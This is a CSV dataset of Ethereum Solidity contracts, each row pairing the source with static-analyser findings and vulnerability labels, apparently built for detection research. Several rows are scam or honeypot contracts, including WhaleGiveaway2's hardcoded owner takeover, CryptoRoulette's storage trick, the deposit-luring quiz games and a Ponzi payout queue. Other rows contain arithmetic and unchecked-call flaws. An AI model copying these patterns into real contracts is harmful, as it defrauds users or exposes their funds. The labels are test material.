,address,tools,lines,nb_vulnerabilities,source_code,vulnerability_category_labels,md5_hash,scores,accepted_labels,token_count
3844,0x420a65ea9add07509f820ce6e24e143f690db99a,"{'mythril': {'vulnerabilities': {}, 'categories': {}}, 'slither': {'vulnerabilities': {}, 'categories': {}}, 'oyente': {'vulnerabilities': {}, 'categories': {}}, 'osiris': {'vulnerabilities': {}, 'categories': {}}, 'smartcheck': {'vulnerabilities': {'SOLIDITY_ARRAY_LENGTH_MANIPULATION': 1, 'SOLIDITY_DIV_MUL': 2, 'SOLIDITY_GAS_LIMIT_IN_LOOPS': 1, 'SOLIDITY_UNCHECKED_CALL': 1}, 'categories': {'arithmetic': 3, 'denial_service': 1, 'unchecked_low_calls': 1}}, 'securify': {'vulnerabilities': {}, 'categories': {}}}","[81, 82, 79, 55]",5,contract CubaLibre { struct Person { address ETHaddress; uint ETHamount; } Person[] public persons; uint public paymentqueue = 0; uint public feecounter; uint amount; address public owner; address public developer=0xC99B66E5Cb46A05Ea997B0847a1ec50Df7fe8976; address meg=this; modifier _onlyowner { if (msg.sender == owner || msg.sender == developer) _ } function CubaLibre() { owner = msg.sender; } function() { enter(); } function enter() { if (msg.sender == owner || msg.sender == developer) { UpdatePay(); } else { feecounter+=msg.value/10; owner.send(feecounter/2); developer.send(feecounter/2); feecounter=0; if (msg.value == (1 ether)/10) { amount = msg.value; uint idx=persons.length; persons.length+=1; persons[idx].ETHaddress=msg.sender; persons[idx].ETHamount=amount; canPay(); } else { msg.sender.send(msg.value - msg.value/10); } } } function UpdatePay() _onlyowner { if (meg.balance>((1 ether)/10)) { msg.sender.send(((1 ether)/10)); } else { msg.sender.send(meg.balance); } } function canPay() internal { while (meg.balance>persons[paymentqueue].ETHamount/100*120) { uint transactionAmount=persons[paymentqueue].ETHamount/100*120; persons[paymentqueue].ETHaddress.send(transactionAmount); paymentqueue+=1; } } },"{'denial_service', 'unchecked_low_calls', 'arithmetic'}",7935311b1135025905bf7e1aa64d9b67,"{'access_control': 0.0, 'arithmetic': np.float64(0.11827716210198437), 'denial_service': np.float64(0.2075828841591358), 'front_running': 0.0, 'reentrancy': 0.0, 'time_manipulation': 0.0, 'unchecked_low_calls': np.float64(0.16784328247863028), 'other': 0.0, 'clean': 0.8888888888888888}","{'denial_service', 'unchecked_low_calls', 'arithmetic'}",387
3845,0x41a25d15eef06891c9d8d134f2e65fb6d8f3a578,"{'mythril': {'vulnerabilities': {}, 'categories': {}}, 'slither': {'vulnerabilities': {}, 'categories': {}}, 'oyente': {'vulnerabilities': {'Integer Underflow.': 1}, 'categories': {'arithmetic': 1}}, 'osiris': {'vulnerabilities': {}, 'categories': {}}, 'smartcheck': {'vulnerabilities': {}, 'categories': {}}, 'securify': {'vulnerabilities': {}, 'categories': {}}}",[4],1,"contract ETO { string public standard = 'ETO 0.1'; string public name; string public symbol; uint8 public decimals; uint256 public initialSupply; uint256 public totalSupply; mapping (address => uint256) public balanceOf; mapping (address => mapping (address => uint256)) public allowance; function ETO() { initialSupply = 314159265; name =""Ethereum Core""; decimals = 2; symbol = ""ETO""; balanceOf[msg.sender] = initialSupply; totalSupply = initialSupply; } function transfer(address _to, uint256 _value) { if (balanceOf[msg.sender] < _value) throw; if (balanceOf[_to] + _value < balanceOf[_to]) throw; balanceOf[msg.sender] -= _value; balanceOf[_to] += _value; } function () { throw; } }",{'arithmetic'},57bbedff7835500b91fe2689a8820b52,"{'access_control': 0.0, 'arithmetic': np.float64(0.220970829953588), 'denial_service': 0.0, 'front_running': 0.0, 'reentrancy': 0.0, 'time_manipulation': 0.0, 'unchecked_low_calls': 0.0, 'other': 0.0, 'clean': 0.8888888888888888}",{'arithmetic'},201
3846,0x4159e265fdfa4e581e9b0b2988346ee7db4f0b7e,"{'mythril': {'vulnerabilities': {'Integer Overflow': 2}, 'categories': {'arithmetic': 2}}, 'slither': {'vulnerabilities': {}, 'categories': {}}, 'oyente': {'vulnerabilities': {'Integer Underflow.': 1, 'Integer Overflow.': 1}, 'categories': {'arithmetic': 2}}, 'osiris': {'vulnerabilities': {'overflow_bugs': 1}, 'categories': {'arithmetic': 1}}, 'smartcheck': {'vulnerabilities': {}, 'categories': {}}, 'manticore': {'vulnerabilities': {}, 'categories': {}}, 'securify': {'vulnerabilities': {}, 'categories': {}}}","[24, 8, 50, 51]",5,"pragma solidity ^0.4.21 ; contract BANK_III_PFI_883 { mapping (address => uint256) public balanceOf; string public name = "" BANK_III_PFI_883 "" ; string public symbol = "" BANK_III_PFI_IMTD "" ; uint8 public decimals = 18 ; uint256 public totalSupply = 416540085732862000000000000 ; event Transfer(address indexed from, address indexed to, uint256 value); function SimpleERC20Token() public { balanceOf[msg.sender] = totalSupply; emit Transfer(address(0), msg.sender, totalSupply); } function transfer(address to, uint256 value) public returns (bool success) { require(balanceOf[msg.sender] >= value); balanceOf[msg.sender] -= value; balanceOf[to] += value; emit Transfer(msg.sender, to, value); return true; } event Approval(address indexed owner, address indexed spender, uint256 value); mapping(address => mapping(address => uint256)) public allowance; function approve(address spender, uint256 value) public returns (bool success) { allowance[msg.sender][spender] = value; emit Approval(msg.sender, spender, value); return true; } function transferFrom(address from, address to, uint256 value) public returns (bool success) { require(value <= balanceOf[from]); require(value <= allowance[from][msg.sender]); balanceOf[from] -= value; balanceOf[to] += value; allowance[from][msg.sender] -= value; emit Transfer(from, to, value); return true; } }",{'arithmetic'},4d71922793486e2151cd123d9e66acec,"{'access_control': 0.0, 'arithmetic': np.float64(0.688514475437834), 'denial_service': 0.0, 'front_running': 0.0, 'reentrancy': 0.0, 'time_manipulation': 0.0, 'unchecked_low_calls': 0.0, 'other': 0.0, 'clean': 0.6666666666666666}",{'arithmetic'},377
3847,0x414bf51522a681dce60ff432067e89ac8326aaf7,"{'mythril': {'vulnerabilities': {'Exception state': 1, 'Integer Overflow': 2}, 'categories': {'Other': 1, 'arithmetic': 2}}, 'slither': {'vulnerabilities': {'arbitrary-send': 1, 'uninitialized-storage': 1, 'incorrect-equality': 1}, 'categories': {'access_control': 1, 'Other': 2}}, 'oyente': {'vulnerabilities': {'Integer Overflow.': 1}, 'categories': {'arithmetic': 1}}, 'osiris': {'vulnerabilities': {}, 'categories': {}}, 'smartcheck': {'vulnerabilities': {}, 'categories': {}}, 'securify': {'vulnerabilities': {'TODTransfer': 1, 'TODAmount': 1}, 'categories': {'front_running': 2}}}","[1, 33, 37, 43, 52, 21]",9,"pragma solidity ^0.4.23; contract CryptoRoulette { uint256 private secretNumber; uint256 public lastPlayed; uint256 public betPrice = 0.2 ether; address public ownerAddr; struct Game { address player; uint256 number; } Game[] public gamesPlayed; constructor() public { ownerAddr = msg.sender; shuffle(); } function shuffle() internal { secretNumber = uint8(sha3(now, block.blockhash(block.number-1))) % 16 + 1; } function play(uint256 number) payable public { require(msg.value >= betPrice && number <= 16); Game game; game.player = msg.sender; game.number = number; gamesPlayed.push(game); if (number == secretNumber) { msg.sender.transfer(this.balance); } shuffle(); lastPlayed = now; } function kill() public { if (msg.sender == ownerAddr && now > lastPlayed + 6 hours) { suicide(msg.sender); } } function() public payable { } }","{'other', 'access_control', 'front_running', 'arithmetic'}",8ad83feeab5c4732d69c3cba8f6f670a,"{'access_control': np.float64(0.14446405201872123), 'arithmetic': np.float64(0.4809315912786981), 'denial_service': 0.0, 'front_running': np.float64(0.15965746899845826), 'reentrancy': 0.0, 'time_manipulation': 0.0, 'unchecked_low_calls': 0.0, 'other': np.float64(0.49892699527353795), 'clean': 0.5555555555555556}","{'other', 'front_running', 'access_control', 'arithmetic'}",237
3848,0x413e0794e1d2e7e26a9536a79a07b2ceb13fb994,"{'mythril': {'vulnerabilities': {'Integer Overflow': 2}, 'categories': {'arithmetic': 2}}, 'slither': {'vulnerabilities': {}, 'categories': {}}, 'oyente': {'vulnerabilities': {'Integer Underflow.': 1, 'Integer Overflow.': 1}, 'categories': {'arithmetic': 2}}, 'osiris': {'vulnerabilities': {'overflow_bugs': 1}, 'categories': {'arithmetic': 1}}, 'smartcheck': {'vulnerabilities': {}, 'categories': {}}, 'securify': {'vulnerabilities': {}, 'categories': {}}}","[24, 8, 50, 51]",5,"pragma solidity ^0.4.21 ; contract SHERE_PFII_II_883 { mapping (address => uint256) public balanceOf; string public name = "" SHERE_PFII_II_883 "" ; string public symbol = "" SHERE_PFII_II_IMTD "" ; uint8 public decimals = 18 ; uint256 public totalSupply = 1219985648835240000000000000 ; event Transfer(address indexed from, address indexed to, uint256 value); function SimpleERC20Token() public { balanceOf[msg.sender] = totalSupply; emit Transfer(address(0), msg.sender, totalSupply); } function transfer(address to, uint256 value) public returns (bool success) { require(balanceOf[msg.sender] >= value); balanceOf[msg.sender] -= value; balanceOf[to] += value; emit Transfer(msg.sender, to, value); return true; } event Approval(address indexed owner, address indexed spender, uint256 value); mapping(address => mapping(address => uint256)) public allowance; function approve(address spender, uint256 value) public returns (bool success) { allowance[msg.sender][spender] = value; emit Approval(msg.sender, spender, value); return true; } function transferFrom(address from, address to, uint256 value) public returns (bool success) { require(value <= balanceOf[from]); require(value <= allowance[from][msg.sender]); balanceOf[from] -= value; balanceOf[to] += value; allowance[from][msg.sender] -= value; emit Transfer(from, to, value); return true; } }",{'arithmetic'},e23c5d004c622382877c81ccf9a2d00a,"{'access_control': 0.0, 'arithmetic': np.float64(0.688514475437834), 'denial_service': 0.0, 'front_running': 0.0, 'reentrancy': 0.0, 'time_manipulation': 0.0, 'unchecked_low_calls': 0.0, 'other': 0.0, 'clean': 0.6666666666666666}",{'arithmetic'},378
3849,0x40ef62929748b3e045fd2036322880ef486e4454,"{'mythril': {'vulnerabilities': {'Integer Overflow': 14, 'Use of tx.origin': 1, 'Integer Underflow': 1, 'Ether send': 1}, 'categories': {'arithmetic': 15, 'access_control': 2}}, 'slither': {'vulnerabilities': {}, 'categories': {}}, 'oyente': {'vulnerabilities': {'Integer Underflow.': 1, 'Integer Overflow.': 1}, 'categories': {'arithmetic': 2}}, 'osiris': {'vulnerabilities': {}, 'categories': {}}, 'smartcheck': {'vulnerabilities': {}, 'categories': {}}, 'securify': {'vulnerabilities': {'TODAmount': 2}, 'categories': {'front_running': 2}}}","[3, 5, 39, 40, 9, 42, 10, 12, 22, 29]",21,"pragma solidity ^0.4.20; contract IQ_GAME { function Play(string _response) external payable { require(msg.sender == tx.origin); if(responseHash == keccak256(_response) && msg.value>1 ether) { msg.sender.transfer(this.balance); } } string public question; address questionSender; bytes32 responseHash; function StartGame(string _question,string _response) public payable { if(responseHash==0x0) { responseHash = keccak256(_response); question = _question; questionSender = msg.sender; } } function StopGame() public payable { require(msg.sender==questionSender); msg.sender.transfer(this.balance); } function NewQuestion(string _question, bytes32 _responseHash) public payable { require(msg.sender==questionSender); question = _question; responseHash = _responseHash; } function() public payable{} }","{'access_control', 'front_running', 'arithmetic'}",e42b9d5df71a86552779b113b73c21b2,"{'access_control': np.float64(0.14446405201872123), 'arithmetic': np.float64(0.4809315912786981), 'denial_service': 0.0, 'front_running': np.float64(0.15965746899845826), 'reentrancy': 0.0, 'time_manipulation': 0.0, 'unchecked_low_calls': 0.0, 'other': 0.0, 'clean': 0.6666666666666666}","{'front_running', 'access_control', 'arithmetic'}",217
3850,0x3fff7a8bfacfe01c901980b894f716987446364d,"{'mythril': {'vulnerabilities': {'Integer Overflow': 1}, 'categories': {'arithmetic': 1}}, 'slither': {'vulnerabilities': {}, 'categories': {}}, 'oyente': {'vulnerabilities': {'Integer Overflow.': 1}, 'categories': {'arithmetic': 1}}, 'osiris': {'vulnerabilities': {'overflow_bugs': 1}, 'categories': {'arithmetic': 1}}, 'smartcheck': {'vulnerabilities': {}, 'categories': {}}, 'securify': {'vulnerabilities': {}, 'categories': {}}}","[59, 91, 60]",3,"pragma solidity ^ 0.4.15; contract GodzSwapGodzEtherCompliance{ address public owner; struct GodzBuyAccounts { uint256 amount; address account; uint sendGodz; } mapping(uint=>GodzBuyAccounts) public accountsHolding; uint public indexAccount = 0; address public swapContract; function GodzSwapGodzEtherCompliance() { owner = msg.sender; } function setHolderInformation(address _swapContract) { if (msg.sender==owner) { swapContract = _swapContract; } } function SaveAccountBuyingGodz(address account, uint256 amount) public returns (bool success) { if (msg.sender==swapContract) { indexAccount += 1; accountsHolding[indexAccount].account = account; accountsHolding[indexAccount].amount = amount; accountsHolding[indexAccount].sendGodz = 0; return true; } else { return false; } } function setSendGodz(uint index) public { if (owner == msg.sender) { accountsHolding[index].sendGodz = 1; } } function getAccountInformation(uint index) public returns (address account, uint256 amount, uint sendGodz) { return (accountsHolding[index].account, accountsHolding[index].amount, accountsHolding[index].sendGodz); } }",{'arithmetic'},ef857777d3c3bb0c66ec71ea784aaa99,"{'access_control': 0.0, 'arithmetic': np.float64(0.688514475437834), 'denial_service': 0.0, 'front_running': 0.0, 'reentrancy': 0.0, 'time_manipulation': 0.0, 'unchecked_low_calls': 0.0, 'other': 0.0, 'clean': 0.6666666666666666}",{'arithmetic'},306
3851,0x3fab284a3cd0a6d88d18d0fda4bc1a76cdacd68a,"{'mythril': {'vulnerabilities': {'Integer Overflow': 14, 'Use of tx.origin': 1, 'Integer Underflow': 1, 'Ether send': 1}, 'categories': {'arithmetic': 15, 'access_control': 2}}, 'slither': {'vulnerabilities': {}, 'categories': {}}, 'oyente': {'vulnerabilities': {'Integer Underflow.': 1, 'Integer Overflow.': 1}, 'categories': {'arithmetic': 2}}, 'osiris': {'vulnerabilities': {}, 'categories': {}}, 'smartcheck': {'vulnerabilities': {}, 'categories': {}}, 'securify': {'vulnerabilities': {'TODAmount': 2}, 'categories': {'front_running': 2}}}","[3, 5, 9, 11, 43, 45, 46, 13, 23, 30]",21,"pragma solidity ^0.4.20; contract qui_qz { function Try(string _response) external payable { require(msg.sender == tx.origin); if(responseHash == keccak256(_response) && msg.value>1 ether) { msg.sender.transfer(this.balance); } } string public question; address questionSender; bytes32 responseHash; function Start_qui_qz(string _question,string _response) public payable { if(responseHash==0x0) { responseHash = keccak256(_response); question = _question; questionSender = msg.sender; } } function StopGame() public payable { require(msg.sender==questionSender); msg.sender.transfer(this.balance); } function NewQuestion(string _question, bytes32 _responseHash) public payable { require(msg.sender==questionSender); question = _question; responseHash = _responseHash; } function() public payable{} }","{'access_control', 'front_running', 'arithmetic'}",c1567ee2873e2e79a4048bc6f1a1fd0e,"{'access_control': np.float64(0.14446405201872123), 'arithmetic': np.float64(0.4809315912786981), 'denial_service': 0.0, 'front_running': np.float64(0.15965746899845826), 'reentrancy': 0.0, 'time_manipulation': 0.0, 'unchecked_low_calls': 0.0, 'other': 0.0, 'clean': 0.6666666666666666}","{'front_running', 'access_control', 'arithmetic'}",223
3852,0x3f9b6264f60cd50b456ed69475862db1c8c62c38,"{'mythril': {'vulnerabilities': {}, 'categories': {}}, 'slither': {'vulnerabilities': {}, 'categories': {}}, 'oyente': {'vulnerabilities': {}, 'categories': {}}, 'osiris': {'vulnerabilities': {'overflow_bugs': 2, 'time_dependency_bug': 1}, 'categories': {'arithmetic': 2, 'time_manipulation': 1}}, 'smartcheck': {'vulnerabilities': {}, 'categories': {}}, 'securify': {'vulnerabilities': {}, 'categories': {}}, 'honeybadger': {'vulnerabilities': {}, 'categories': {}}}","[49, 31]",3,pragma solidity 0.4.21; contract RACEFORETH { uint256 public SCORE_TO_WIN = 1000 finney; uint256 PRIZE; uint256 public speed_limit = 500 finney; mapping (address => uint256) racerScore; mapping (address => uint256) racerSpeedLimit; uint256 latestTimestamp; address owner; function RACEFORETH () public payable { PRIZE = msg.value; owner = msg.sender; } function race() public payable { if (racerSpeedLimit[msg.sender] == 0) { racerSpeedLimit[msg.sender] = speed_limit; } require(msg.value <= racerSpeedLimit[msg.sender] && msg.value > 1 wei); racerScore[msg.sender] += msg.value; racerSpeedLimit[msg.sender] = (racerSpeedLimit[msg.sender] / 2); latestTimestamp = now; if (racerScore[msg.sender] >= SCORE_TO_WIN) { msg.sender.transfer(this.balance); } } function () public payable { race(); } function endRace() public { require(msg.sender == owner); require(now > latestTimestamp + 3 days); msg.sender.transfer(this.balance); } },"{'time_manipulation', 'arithmetic'}",65b122252fd0cffff3597f82a1db3ee2,"{'access_control': 0.0, 'arithmetic': np.float64(0.2075828841591358), 'denial_service': 0.0, 'front_running': 0.0, 'reentrancy': 0.0, 'time_manipulation': np.float64(0.1111111111111111), 'unchecked_low_calls': 0.0, 'other': 0.0, 'clean': 0.8888888888888888}","{'time_manipulation', 'arithmetic'}",287
3853,0x3f2ef511aa6e75231e4deafc7a3d2ecab3741de2,"{'mythril': {'vulnerabilities': {'Integer Overflow': 1, 'Transaction order dependence': 2, 'Message call to external contract': 1, 'Unchecked CALL return value': 1, 'Ether send': 1}, 'categories': {'arithmetic': 1, 'front_running': 2, 'reentrancy': 1, 'unchecked_low_calls': 1, 'access_control': 1}}, 'slither': {'vulnerabilities': {'arbitrary-send': 1, 'low-level-calls': 1}, 'categories': {'access_control': 1, 'unchecked_low_calls': 1}}, 'oyente': {'vulnerabilities': {'Integer Overflow.': 1, 'Callstack Depth Attack Vulnerability.': 1}, 'categories': {'arithmetic': 1, 'denial_service': 1}}, 'osiris': {'vulnerabilities': {'reentrancy_bug': 1}, 'categories': {'reentrancy': 1}}, 'smartcheck': {'vulnerabilities': {'SOLIDITY_UNCHECKED_CALL': 1}, 'categories': {'unchecked_low_calls': 1}}, 'securify': {'vulnerabilities': {'TODReceiver': 2, 'UnhandledException': 1, 'TODAmount': 3}, 'categories': {'front_running': 5, 'unchecked_low_calls': 1}}}","[33, 38, 39, 15, 20, 21, 30]",18,"pragma solidity ^0.4.19; contract WhaleGiveaway2 { address public Owner = msg.sender; uint constant public minEligibility = 0.999001 ether; function() public payable { } function redeem() public payable { if(msg.value>=minEligibility) { Owner.transfer(this.balance); msg.sender.transfer(this.balance); } } function withdraw() payable public { if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;} require(msg.sender == Owner); Owner.transfer(this.balance); } function Command(address adr,bytes data) payable public { require(msg.sender == Owner); adr.call.value(msg.value)(data); } }","{'reentrancy', 'arithmetic', 'access_control', 'denial_service', 'unchecked_low_calls', 'front_running'}",9d047be09519f997edad5febe03a95b8,"{'access_control': np.float64(0.28892810403744246), 'arithmetic': np.float64(0.4809315912786981), 'denial_service': np.float64(0.2075828841591358), 'front_running': np.float64(0.3193149379969165), 'reentrancy': np.float64(0.482353806040765), 'time_manipulation': 0.0, 'unchecked_low_calls': np.float64(0.6753862082409147), 'other': 0.0, 'clean': 0.3333333333333333}","{'reentrancy', 'access_control', 'arithmetic', 'denial_service', 'unchecked_low_calls', 'front_running'}",221
3854,0x3eb13bb9b01018b27c1bae50579e50c4094efdc1,"{'mythril': {'vulnerabilities': {'Integer Overflow': 2}, 'categories': {'arithmetic': 2}}, 'slither': {'vulnerabilities': {}, 'categories': {}}, 'oyente': {'vulnerabilities': {'Integer Underflow.': 1}, 'categories': {'arithmetic': 1}}, 'osiris': {'vulnerabilities': {'overflow_bugs': 1}, 'categories': {'arithmetic': 1}}, 'smartcheck': {'vulnerabilities': {}, 'categories': {}}, 'securify': {'vulnerabilities': {}, 'categories': {}}}","[24, 8, 50, 51]",4,"pragma solidity ^0.4.21 ; contract AIRPORT_CITY_20230515 { mapping (address => uint256) public balanceOf; string public name = "" AIRPORT_CITY_20230515 "" ; string public symbol = "" AIRCITI "" ; uint8 public decimals = 18 ; uint256 public totalSupply = 14819434587663000000000000 ; event Transfer(address indexed from, address indexed to, uint256 value); function SimpleERC20Token() public { balanceOf[msg.sender] = totalSupply; emit Transfer(address(0), msg.sender, totalSupply); } function transfer(address to, uint256 value) public returns (bool success) { require(balanceOf[msg.sender] >= value); balanceOf[msg.sender] -= value; balanceOf[to] += value; emit Transfer(msg.sender, to, value); return true; } event Approval(address indexed owner, address indexed spender, uint256 value); mapping(address => mapping(address => uint256)) public allowance; function approve(address spender, uint256 value) public returns (bool success) { allowance[msg.sender][spender] = value; emit Approval(msg.sender, spender, value); return true; } function transferFrom(address from, address to, uint256 value) public returns (bool success) { require(value <= balanceOf[from]); require(value <= allowance[from][msg.sender]); balanceOf[from] -= value; balanceOf[to] += value; allowance[from][msg.sender] -= value; emit Transfer(from, to, value); return true; } }",{'arithmetic'},e787e4d8e07822ff66c5beb5267065de,"{'access_control': 0.0, 'arithmetic': np.float64(0.688514475437834), 'denial_service': 0.0, 'front_running': 0.0, 'reentrancy': 0.0, 'time_manipulation': 0.0, 'unchecked_low_calls': 0.0, 'other': 0.0, 'clean': 0.6666666666666666}",{'arithmetic'},371
3855,0x3e8b42754c8eafdc8e732f4346126e920ede8548,"{'mythril': {'vulnerabilities': {}, 'categories': {}}, 'slither': {'vulnerabilities': {}, 'categories': {}}, 'oyente': {'vulnerabilities': {}, 'categories': {}}, 'osiris': {'vulnerabilities': {}, 'categories': {}}, 'smartcheck': {'vulnerabilities': {}, 'categories': {}}, 'securify': {'vulnerabilities': {'LockedEther': 1}, 'categories': {'Other': 1}}}",[2],1,"pragma solidity ^0.5.0; contract HelloWorld{ function Hello() public pure returns (string memory){ return (""Hello World""); } } contract ConstantinopleCheck{ address public DeployedContractAddress; function deploy() public { bytes memory code = hex'608060405234801561001057600080fd5b50610124806100206000396000f3fe6080604052348015600f57600080fd5b50600436106044577c01000000000000000000000000000000000000000000000000000000006000350463bcdfe0d581146049575b600080fd5b604f60c1565b6040805160208082528351818301528351919283929083019185019080838360005b8381101560875781810151838201526020016071565b50505050905090810190601f16801560b35780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b60408051808201909152600b81527f48656c6c6f20576f726c6400000000000000000000000000000000000000000060208201529056fea165627a7a72305820569c1233dc571997cbd1fa15675cd16b4cacd5615abb6c991dd85a516af1ecc80029'; uint len = code.length; address deployed; assembly{ deployed := create2(0, add(code, 0x20), len, ""Hello Constantinople!"") } DeployedContractAddress = deployed; } function IsItConstantinople() public view returns (bool, bytes32){ address target = address(this); bytes32 hash; assembly{ hash := extcodehash(target) } return (true, hash); } function Hello() public view returns (string memory) { return (HelloWorld(DeployedContractAddress).Hello()); } }",{'other'},17fc7359c374cb057477e66f656b8206,"{'access_control': 0.0, 'arithmetic': 0.0, 'denial_service': 0.0, 'front_running': 0.0, 'reentrancy': 0.0, 'time_manipulation': 0.0, 'unchecked_low_calls': 0.0, 'other': np.float64(0.1111111111111111), 'clean': 0.8888888888888888}",{'other'},446
3856,0x3e72548c1535beadcdf084ec13fd7850c49050ed,"{'mythril': {'vulnerabilities': {}, 'categories': {}}, 'slither': {'vulnerabilities': {}, 'categories': {}}, 'oyente': {'vulnerabilities': {}, 'categories': {}}, 'osiris': {'vulnerabilities': {}, 'categories': {}}, 'smartcheck': {'vulnerabilities': {}, 'categories': {}}, 'securify': {'vulnerabilities': {}, 'categories': {}}}",[],0,"contract testExpensiveFallback { address constant WithdrawDAO = 0xbf4ed7b27f1d666546e30d74d50d173d20bca754; address constant DarkDAO = 0x304a554a310c7e546dfe434669c62820b7d83490; address constant veox = 0x1488e30b386903964b2797c97c9a3a678cf28eca; bool public ran; bool public forked; bool public notforked; modifier before_dao_hf_block { if (block.number >= 1920000) throw; _ } modifier run_once { if (ran) throw; _ } modifier has_millions(address _addr, uint _millions) { if (_addr.balance >= (_millions * 1000000 ether)) _ } function check_withdrawdao() internal has_millions(WithdrawDAO, 10) { forked = true; } function check_darkdao() internal has_millions(DarkDAO, 3) { notforked = true; } function kill1() { suicide(veox); } function kill2() { selfdestruct(veox); } function () before_dao_hf_block run_once { ran = true; check_withdrawdao(); check_darkdao(); if (forked == notforked) throw; } }",set(),df09d7f616c55321e8b9c092ef07847e,"{'access_control': 0.0, 'arithmetic': 0.0, 'denial_service': 0.0, 'front_running': 0.0, 'reentrancy': 0.0, 'time_manipulation': 0.0, 'unchecked_low_calls': 0.0, 'other': 0.0, 'clean': 1.0}",{'clean'},314
3857,0x3e682e0f9ef8b5e036256060426b02811b23fc87,"{'mythril': {'vulnerabilities': {'Integer Overflow': 2}, 'categories': {'arithmetic': 2}}, 'slither': {'vulnerabilities': {}, 'categories': {}}, 'oyente': {'vulnerabilities': {'Integer Underflow.': 1}, 'categories': {'arithmetic': 1}}, 'osiris': {'vulnerabilities': {}, 'categories': {}}, 'smartcheck': {'vulnerabilities': {}, 'categories': {}}, 'securify': {'vulnerabilities': {}, 'categories': {}}, 'honeybadger': {'vulnerabilities': {}, 'categories': {}}}","[24, 8, 51]",3,"pragma solidity ^0.4.25 ; contract CCD_KOHLE_9_20190411 { mapping (address => uint256) public balanceOf; string public name = "" CCD_KOHLE_9_20190411 "" ; string public symbol = "" CCD_KOHLE_9_20190411_subDT "" ; uint8 public decimals = 18 ; uint256 public totalSupply = 19800000000000000000000000 ; event Transfer(address indexed from, address indexed to, uint256 value); function SimpleERC20Token() public { balanceOf[msg.sender] = totalSupply; emit Transfer(address(0), msg.sender, totalSupply); } function transfer(address to, uint256 value) public returns (bool success) { require(balanceOf[msg.sender] >= value); balanceOf[msg.sender] -= value; balanceOf[to] += value; emit Transfer(msg.sender, to, value); return true; } event Approval(address indexed owner, address indexed spender, uint256 value); mapping(address => mapping(address => uint256)) public allowance; function approve(address spender, uint256 value) public returns (bool success) { allowance[msg.sender][spender] = value; emit Approval(msg.sender, spender, value); return true; } function transferFrom(address from, address to, uint256 value) public returns (bool success) { require(value <= balanceOf[from]); require(value <= allowance[from][msg.sender]); balanceOf[from] -= value; balanceOf[to] += value; allowance[from][msg.sender] -= value; emit Transfer(from, to, value); return true; } }",{'arithmetic'},04841629e76a2bdb31a3d42f1d264797,"{'access_control': 0.0, 'arithmetic': np.float64(0.4809315912786981), 'denial_service': 0.0, 'front_running': 0.0, 'reentrancy': 0.0, 'time_manipulation': 0.0, 'unchecked_low_calls': 0.0, 'other': 0.0, 'clean': 0.7777777777777778}",{'arithmetic'},383
